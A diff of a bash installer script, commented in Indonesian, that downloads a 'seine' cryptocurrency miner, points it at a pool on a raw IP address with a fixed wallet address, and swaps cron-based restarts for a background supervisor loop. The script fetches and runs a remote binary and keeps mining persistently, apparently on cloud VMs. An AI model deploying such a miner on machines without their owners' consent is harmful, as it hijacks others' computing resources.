@@ -1,13 +1,13 @@
 #!/usr/bin/env bash
 # orgo.sh — install + jalankan BNT miner (seine) ke relay, auto-restart.
-# Threads AUTO-deteksi: seine ukur sendiri dari RAM (2 GB/thread). Jalankan sekali saja.
+# Threads AUTO (seine ukur dari RAM). TANPA cron (supervisor loop) biar jalan di VM minimal.
 set -euo pipefail
 
 RELAY="stratum+tcp://13.140.137.45:8443"
 ADDRESS="PLMGsifmTC9Zn5pHqcMkbayvzSG3SBX6vAwJts3KQCwfGRsznpv2qdyCFyRpnh46TwcQu8mLEu1CVdHdQzsx7Ty637GQc"
 WORKER="orgo-$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9-' || echo "r$RANDOM")"
 
-echo "[1/4] download seine v0.3.1"
+echo "[1/3] download seine v0.3.1"
 mkdir -p "$HOME/bin"
 if [ ! -x "$HOME/bin/seine" ]; then
   curl -fsSL --max-time 180 -o /tmp/seine.tar.gz \
@@ -17,7 +17,7 @@ if [ ! -x "$HOME/bin/seine" ]; then
   rm -f /tmp/seine.tar.gz
 fi
 
-echo "[2/4] tulis starter (threads AUTO dari RAM)"
+echo "[2/3] tulis starter (threads AUTO dari RAM)"
 cat > "$HOME/orgo-start.sh" <<EOF
 #!/bin/bash
 exec \$HOME/bin/seine --pool-url "$RELAY" --address "$ADDRESS" --pool-worker "$WORKER" \\
@@ -25,16 +25,12 @@ exec \$HOME/bin/seine --pool-url "$RELAY" --address "$ADDRESS" --pool-worker "$W
 EOF
 chmod +x "$HOME/orgo-start.sh"
 
-echo "[3/4] start miner"
+echo "[3/3] start miner + auto-restart (supervisor loop 60dtk)"
 pkill -x seine 2>/dev/null || true
 nohup "$HOME/orgo-start.sh" >> "$HOME/seine.log" 2>&1 &
+nohup sh -c "while true; do pgrep -x seine >/dev/null 2>&1 || $HOME/orgo-start.sh >> $HOME/seine.log 2>&1; sleep 60; done" \
+  >> "$HOME/orgo-watch.log" 2>&1 &
 sleep 8
-
-echo "[4/4] pasang auto-restart (tiap menit + @reboot)"
-( crontab -l 2>/dev/null | grep -v 'orgo-start'; \
-  echo "@reboot \$HOME/orgo-start.sh >> \$HOME/seine.log 2>&1"; \
-  echo "* * * * * pgrep -x seine >/dev/null || \$HOME/orgo-start.sh >> \$HOME/seine.log 2>&1" ) \
-  | crontab -
 
 echo ""
 echo "DONE. proses seine: $(pgrep -x seine | wc -l) (harusnya >= 1)"
